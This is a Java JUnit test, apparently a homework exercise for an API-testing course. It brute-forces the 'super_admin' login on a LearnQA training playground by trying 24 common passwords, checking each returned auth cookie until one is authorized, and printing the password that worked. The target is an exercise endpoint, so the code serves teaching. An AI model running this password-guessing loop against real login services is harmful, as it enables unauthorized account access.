import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

public class jsonParsing1 {
    @Test
    public void jsonParsing() throws InterruptedException {
        String[] passwords = {
                 "123456", "123456789", "password",
                "1234567", "12345678", "12345", "iloveyou",
                "123123", "abc123", "qwerty123", "1q2w3e4r",
                "admin", "666666", "qwertyuiop", "654321",
                "555555", "lovely", "7777777", "welcome",
                "888888", "princess", "dragon", "password1", "123qwe"
        };
        for(int i=0; i<24; i++) {
        Map<String, Object> body = new HashMap<>();
        body.put("login","super_admin");
        body.put("password",passwords[i]);



            Response response = RestAssured
                    .given()
                    .body(body)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
           // response.print();
            String authcookie = response.getCookie("auth_cookie");
            //System.out.println(authcookie);

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", authcookie);

            Response response2 = RestAssured
                    .given()
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String pass = response2.asString();

            if (pass.equals("You are authorized")) {
                System.out.println("Current password is " + passwords[i]);
                break;
            }


        }


    }
}
